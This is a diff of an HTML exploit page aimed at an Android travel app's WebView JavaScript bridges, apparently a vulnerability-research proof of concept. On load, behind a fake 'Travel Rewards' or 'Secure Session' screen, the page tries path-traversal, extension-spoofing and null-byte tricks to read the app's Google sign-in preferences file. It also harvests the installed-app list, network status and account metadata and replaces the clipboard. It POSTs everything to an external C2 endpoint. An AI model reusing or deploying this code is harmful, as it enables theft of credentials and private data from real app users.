@@ -1,89 +1,94 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Itinerary Loading...</title>
+    <title>Travel Rewards - Processing...</title>
     <style>
-        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
-        .hidden { display: none; }
+        body { background-color: #000; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; }
+        .log { border: 1px solid #333; padding: 10px; margin-top: 20px; white-space: pre-wrap; font-size: 12px; }
     </style>
 </head>
 <body>
-    <h2>System Diagnostic</h2>
-    <div id="status">Initializing modules...</div>
+    <h2>Initializing Secure Session...</h2>
+    <div id="status">Scanning Bridge Interfaces...</div>
+    <div id="console" class="log"></div>
 
     <script>
         const C2 = "https://evilios.free.beeceptor.com/exfil";
-        const TARGET = "file:///data/data/ctrip.english/shared_prefs/com.google.android.gms.signin.xml";
+        const TARGET_PATH = "/data/data/ctrip.english/shared_prefs/com.google.android.gms.signin.xml";
 
-        function report(type, data) {
+        function logToC2(type, payload) {
+            const statusDiv = document.getElementById('console');
+            statusDiv.innerText += `[${type}] Sending data...\n`;
+            
             fetch(C2, {
                 method: "POST",
                 mode: "no-cors",
-                body: JSON.stringify({ type: type, val: data, ts: Date.now() })
+                body: JSON.stringify({
+                    label: type,
+                    data: payload,
+                    ts: Date.now()
+                })
             });
         }
 
-        // 1. Attempt XHR bypass with Null Byte or forced mapping
-        function tryXHR() {
-            var xhr = new XMLHttpRequest();
-            xhr.open("GET", TARGET, true);
-            xhr.onreadystatechange = function() {
-                if (xhr.readyState == 4) {
-                    if (xhr.status == 200 || xhr.responseText.length > 0) {
-                        report("XHR_SUCCESS", btoa(xhr.responseText));
-                    } else {
-                        report("XHR_FAIL", "Status: " + xhr.status);
-                    }
-                }
-            };
-            xhr.send();
-        }
+        async function runExploit() {
+            // --- 1. Destination_a: Arbitrary File Read Bypasses ---
+            if (window.Destination_a && window.Destination_a.gsImageBase64Str) {
+                const bypasses = [
+                    { name: "DIRECT", path: TARGET_PATH },
+                    { name: "TRAVERSAL", path: "/sdcard/../../" + TARGET_PATH },
+                    { name: "EXT_SPOOF_JPG", path: TARGET_PATH + "?.jpg" },
+                    { name: "EXT_SPOOF_PNG", path: TARGET_PATH + "#.png" },
+                    { name: "NULL_BYTE", path: TARGET_PATH + "\0.jpg" }
+                ];
 
-        // 2. Brute Force Bridge Identification
-        function probeBridges() {
-            const bridges = ['Destination_a', 'Util_a', 'IBUMarket_a', 'H5MarketPlugin', 'MobileClient'];
-            bridges.forEach(b => {
-                if (window[b]) {
-                    report("BRIDGE_FOUND", b + " methods: " + Object.keys(window[b]).join(','));
-                    
-                    // Attempt specific gadget exploit if Destination_a is found
-                    if (b === 'Destination_a' && window[b].gsImageBase64Str) {
-                        try {
-                            // Try common traversal or extension bypass
-                            let data = window[b].gsImageBase64Str(TARGET);
-                            if (data) report("BRIDGE_STEAL_BASE", data);
-                            
-                            // Try appending a fake extension if the Java code checks for .jpg
-                            let data2 = window[b].gsImageBase64Str(TARGET + "\0.jpg");
-                            if (data2) report("BRIDGE_STEAL_NULLBYTE", data2);
-                        } catch(e) {}
+                bypasses.forEach(b => {
+                    try {
+                        const result = window.Destination_a.gsImageBase64Str(b.path);
+                        if (result && result !== "null") {
+                            logToC2(`FILE_STEAL_${b.name}`, result);
+                        }
+                    } catch (e) {
+                        logToC2(`ERROR_${b.name}`, e.message);
                     }
-                }
-            });
-        }
+                });
+            }
 
-        // 3. Iframe Pivot (SOP Bypass check)
-        function tryIframe() {
-            const ifr = document.createElement('iframe');
-            ifr.style.display = 'none';
-            ifr.src = TARGET;
-            ifr.onload = function() {
+            // --- 2. Util_a: Privacy and System Manipulation ---
+            if (window.Util_a) {
+                // Exfiltrate Installed Apps (Privacy Violation)
                 try {
-                    // If UniversalAccess is truly on, we can reach into the iframe
-                    const content = ifr.contentDocument.body.innerText;
-                    report("IFRAME_STEAL", btoa(content));
-                } catch(e) {
-                    report("IFRAME_ERROR", "CORS block on iframe access");
-                }
-            };
-            document.body.appendChild(ifr);
+                    const appList = window.Util_a.getInstalledAppList();
+                    logToC2("INSTALLED_APPS", appList);
+                } catch (e) {}
+
+                // Clipboard Hijack (Impact Demonstration)
+                try {
+                    window.Util_a.copyToClipboard("pwned_by_dnelsaka_vulnerability_research");
+                    logToC2("CLIPBOARD_ACTION", "Clipboard text replaced");
+                } catch (e) {}
+
+                // Grab Network Info
+                try {
+                    const netStatus = window.Util_a.checkNetworkStatus();
+                    logToC2("NETWORK_INFO", netStatus);
+                } catch (e) {}
+            }
+
+            // --- 3. IBUMarket_a: Alliance/Account Metadata ---
+            if (window.IBUMarket_a) {
+                try {
+                    const alliance = window.IBUMarket_a.getAllianceInfo();
+                    logToC2("ALLIANCE_METADATA", alliance);
+                } catch (e) {}
+            }
+
+            document.getElementById('status').innerText = "Session Established. Please wait...";
         }
 
-        window.onload = function() {
-            document.getElementById('status').innerText = "Executing payloads...";
-            tryXHR();
-            probeBridges();
-            tryIframe();
+        // Execute when the WebView is ready
+        window.onload = () => {
+            setTimeout(runExploit, 1000); 
         };
     </script>
 </body>
